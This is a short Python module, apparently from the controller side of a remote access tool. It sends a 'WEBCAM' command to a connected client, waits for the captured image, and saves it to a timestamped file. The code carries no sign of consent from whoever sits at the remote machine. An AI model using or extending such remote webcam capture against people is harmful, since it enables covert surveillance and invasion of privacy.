""" Webcam functionality """
import logging
from datetime import datetime

from modules.clients import Client
from utils.timeout_handler import timeoutsetter


def webcam(client: Client, filename: str = None) -> str:
    """ Capture webcam """
    logging.debug('Capturing webcam (%s)', client.id)
    client.write(b'WEBCAM')

    with timeoutsetter(client, 120):
        img_data = client.read()

    if img_data == b'ERROR':
        logging.error('Unable to capture webcam (%s)', client.id)
        raise RuntimeError('Unable to capture webcam')

    if filename is None:
        filename = f'webcam-{datetime.now()}.png'.replace(':', '-')

    with open(filename, 'wb') as file:
        file.write(img_data)
    logging.info('Saved webcam capture at (%s): %s', client.id, filename)
    return filename
